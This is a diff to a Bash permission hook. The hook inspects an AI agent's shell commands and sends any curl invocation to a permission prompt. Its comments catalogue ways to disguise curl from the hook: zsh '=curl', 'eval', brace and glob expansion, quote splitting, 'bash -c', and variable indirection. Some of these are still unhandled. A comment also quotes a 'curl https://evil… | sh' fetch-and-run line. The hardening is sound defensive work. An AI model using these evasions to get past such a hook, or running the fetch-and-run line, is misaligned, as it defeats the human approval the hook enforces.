@@ -20,8 +20,8 @@
 #
 # フックが死ぬ(未配置・クラッシュ)と curl は classifier の判定だけになる(git-push-guard と同じ向き)。
 # 8192 byte を超えるコマンドは安く読めないので、行単位の字面の床だけを当てる(ADR 0009)。
-# 残存(ADR 0009): `bash -c "curl …"` の内側、`cu""rl …`(下の `*curl*` の早期終了が
-# reader の引用符除去より先に走る)、`c=curl; $c …`(curl と読める token が無い)。
+# 残存(ADR 0009): `bash -c "curl …"` の内側、`cu""rl …` や `/usr/bin/cur?`(下の `*curl*` の
+# 早期終了が reader の引用符除去と展開より先に走る)、`c=curl; $c …`(curl と読める token が無い)。
 #
 # Recognition is therefore an allowlist at every level — flags, pipe targets,
 # URL schemes, hosts. An unrecognized token is not "probably fine", it is a
@@ -88,11 +88,14 @@ esac
 # 振り替わる。`--resolve` / `--connect-to` / `-x` を綴りで落としても、コマンド文字列に痕跡を
 # 残さないファイル 1 つで無効になるため、存在自体を「読み切れない」として扱う。
 # ここでは記録だけして、判定は curl を実行しうる token があるか確かめた後(末尾)で行う。
-# curl は次のうち最初に存在するものを読む。このリポジトリは curlrc を管理していない。
+# curl は次のうち最初に存在するものを読む。XDG_CONFIG_HOME が無いときは `$CURL_HOME/.config/curlrc` と
+# `$HOME/.config/curlrc` も読む(curl 8.7.1 で実測)。順序は問わず、どれか 1 つでもあれば扱いは同じ。
+# このリポジトリは curlrc を管理していない。
 # (環境変数の `http_proxy` も同じクラスだが、フックの環境は Bash ツールの環境と別なので検査不能。)
 CURLRC_PRESENT=0
-for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.curlrc"; do
-    case "$rc" in /.curlrc | /curlrc) continue ;; esac
+for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.curlrc" \
+    "${CURL_HOME:-}/.config/curlrc" "${HOME:-}/.config/curlrc"; do
+    case "$rc" in /.curlrc | /curlrc | /.config/curlrc) continue ;; esac
     if [[ -e "$rc" || -L "$rc" ]]; then
         CURLRC_PRESENT=1
         break
@@ -121,7 +124,7 @@ source "$reader_library" || {
     emit_ask
     exit 0
 }
-declare -F shell_reader_read shell_reader_each_segment >/dev/null || {
+declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches >/dev/null || {
     emit_ask
     exit 0
 }
@@ -382,7 +385,8 @@ SAW_CURL=0
 # 1 segment を分類する。コマンド全体をプロンプトに残すべきときは非 0。
 # reader が segment ごとに呼ぶ(引数が segment の token)。
 classify_segment() {
-    local segment=("$@") binary=$1 index
+    # 語頭の `=` は zsh の EQUALS(`=curl` は PATH 上の curl)。外して同じ判定に掛ける。
+    local segment=("$@") binary=${1#=} index
 
     # No prefix skipping. `VAR=value curl …` can set http_proxy, and `env` /
     # `sudo` can do the same, so an unrecognized leading word is a prompt rather
@@ -430,28 +434,13 @@ classify_segment() {
 # シェルのキーワード(`then curl …`、`do curl …`、`{ curl …; }`)もコマンドの位置を作る。heredoc に
 # 飲み込まれた行が `if …; then curl … | sh; fi` でも一致するように含める。`case` の `a) curl …` の `)` は
 # 含めない — `"$(date) curl is fine"` の散文まで ask になる(受容した残存)。
-CURL_PREFIX_WORD_RE='([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|command|builtin|env|exec|sudo|doas|nice|nohup|time|timeout|xargs|stdbuf|ionice|caffeinate|if|then|elif|else|while|until|do|[!]|[{])'
+# `eval` も前置詞に含める(`"$(eval curl …)"` の curl は eval の引数として実行される)。
+CURL_PREFIX_WORD_RE='([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|command|builtin|eval|env|exec|sudo|doas|nice|nohup|time|timeout|xargs|stdbuf|ionice|caffeinate|if|then|elif|else|while|until|do|[!]|[{])'
 CURL_LINE_RE="(^|[;&|(\`])[[:space:]]*(${CURL_PREFIX_WORD_RE}[[:space:]]+([^[:space:]]+[[:space:]]+)*)?\\\\?([^[:space:]]*/)?curl([[:space:]]|\$)"
-# here-string は一時ファイルを使う($TMPDIR に書けないと黙って「一致なし」になる)ので使わない。
-# `${s%%$'\n'*}` / `${s#*$'\n'}` の行ループも使わない — 残りの文字列を毎行コピーするので二乗になり、
-# 長さ超過の入力(下)で 179 KB に 2.3 秒かかった。改行での単語分割は線形(同じ入力で 0.02 秒)。
-# 空行は落ちるが、空行は正規表現に一致しない。
+# 行の分割と、引用符・backslash・行継続の正規化は lib の shell_reader_any_line_matches が行う
+# (`"$(curl'' https://…)"` も `curl https://…` として見る)。
 curl_text_floor() {
-    local LC_ALL=C IFS=$'\n' line restore_glob=0
-    local -a lines
-    # 分割の結果が glob として cwd に展開されないように、分割の間だけ set -f にする。
-    if [[ $- != *f* ]]; then
-        set -f
-        restore_glob=1
-    fi
-    # shellcheck disable=SC2206 # 改行での単語分割そのものが目的
-    lines=($1)
-    [[ $restore_glob -eq 1 ]] && set +f
-    [[ ${#lines[@]} -eq 0 ]] && return 1
-    for line in "${lines[@]}"; do
-        [[ "$line" =~ $CURL_LINE_RE ]] && return 0
-    done
-    return 1
+    shell_reader_any_line_matches "$1" "$CURL_LINE_RE"
 }
 
 shell_reader_read "$COMMAND"
@@ -466,13 +455,49 @@ fi
 
 # curl を実行しうる token があるか。引用符の中の文字列は reader が 1 token にまとめるので、
 # `echo "curl …"` の `curl …` はここで一致しない。バッククォートで始まる token は実行されるので外して見る。
+# 語頭の `=` も外す: Bash ツールが zsh で動く環境では `=curl` が PATH 上の curl に展開される(EQUALS)。
+# ブレース展開とパス名展開は、展開の結果としてだけ curl を作れる(bash の `{curl,https://…}`、
+# zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*`)。そういう印の付いた token が、展開の結果として
+# basename が `curl` の語になりうれば実行しうるとみなし、下の WORD_MULTIPLIER か segment の走査で ask に
+# する。`test/curl-*.bats` のように curl を含んでも curl にはなりえない glob は巻き込まない。
+# 受容した誤 ask: `ls docs/*curl*` のように、basename が curl になりうる glob を引数に書いたもの。
+
+# 印の付いた token $1 が、展開の結果として basename が `curl` の語になりうるか。ブレース展開の
+# token(`curl,https://…`)は `,` で区切った要素ごとに、パス名展開の token はそのものをパターンとして
+# 照合する(どちらも区切ると広がる方向にしか動かない)。
+marked_token_can_be_curl() {
+    local rest=$1 element
+    while :; do
+        element=${rest%%,*}
+        # 右辺は引用しない: 展開の結果を推し量るためにパターンとして照合する。
+        # shellcheck disable=SC2053
+        [[ curl == ${element##*/} ]] && return 0
+        [[ "$rest" == *,* ]] || return 1
+        rest=${rest#*,}
+    done
+}
+
 CURL_PRESENT=0
-for token in "${SHELL_READER_TOKENS[@]}"; do
+for index in "${!SHELL_READER_TOKENS[@]}"; do
+    token=${SHELL_READER_TOKENS[$index]}
     token=${token#\`}
+    token=${token#=}
     if [[ "${token##*/}" == "curl" ]]; then
         CURL_PRESENT=1
         break
     fi
+    case "$token" in
+    *curl*)
+        case "$SHELL_READER_BRACE_INDEXES$SHELL_READER_GLOB_INDEXES" in
+        *" $index "*)
+            if marked_token_can_be_curl "$token"; then
+                CURL_PRESENT=1
+                break
+            fi
+            ;;
+        esac
+        ;;
+    esac
 done
 
 # 改行を含む token には、curl が見つかったかどうかに関係なく字面の床を当てる。reader は heredoc と
@@ -480,37 +505,34 @@ done
 # 次の同じ引用符までの行(bash が実行する `curl https://evil… | sh` を含む)が 1 token に飲み込まれる。
 # 閉じる引用符もそろうと UNCLOSED_QUOTE は立たず、飲み込まれた token が INERT_COMMANDS の引数に入れば
 # segment の走査も通る。
-for token in "${SHELL_READER_TOKENS[@]}"; do
+# curl が見つからなかったときだけ床を当てる token: `$` かバッククォートを含むものと、引用符が閉じないまま
+# 終わったときの最後の token(上の説明)。
+# 対象の token は改行で区切って 1 つにまとめ、床は 1 回だけ呼ぶ。床は引用符や backslash を含む入力で
+# awk / tr を fork するので、token ごとに呼ぶと `"$'"` を 1000 個並べただけで秒単位になり、フックの
+# timeout(5 秒)を越えると判定なし = フェイルオープンになる。
+floor_text=''
+last_index=$((${#SHELL_READER_TOKENS[@]} - 1))
+for index in "${!SHELL_READER_TOKENS[@]}"; do
+    token=${SHELL_READER_TOKENS[$index]}
     case "$token" in
-    *$'\n'*)
-        if curl_text_floor "$token"; then
-            emit_ask
-            exit 0
+    *$'\n'*) floor_text+=$token$'\n' ;;
+    *'$'* | *'`'*)
+        if [[ $CURL_PRESENT -eq 0 ]]; then
+            floor_text+=$token$'\n'
+        fi
+        ;;
+    *)
+        if [[ $CURL_PRESENT -eq 0 && $SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index ]]; then
+            floor_text+=$token$'\n'
         fi
         ;;
     esac
 done
-
-# 見つからなかったときだけ、字面の床を当てる token: `$` かバッククォートを含むものと、
-# 引用符が閉じないまま終わったときの最後の token(上の説明)。
+if [[ -n "$floor_text" ]] && curl_text_floor "$floor_text"; then
+    emit_ask
+    exit 0
+fi
 if [[ $CURL_PRESENT -eq 0 ]]; then
-    last_index=$((${#SHELL_READER_TOKENS[@]} - 1))
-    for index in "${!SHELL_READER_TOKENS[@]}"; do
-        token=${SHELL_READER_TOKENS[$index]}
-        case "$token" in
-        *'$'* | *'`'*)
-            if curl_text_floor "$token"; then
-                emit_ask
-                exit 0
-            fi
-            ;;
-        esac
-        if [[ $SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index ]] &&
-            curl_text_floor "$token"; then
-            emit_ask
-            exit 0
-        fi
-    done
     exit 0
 fi
 
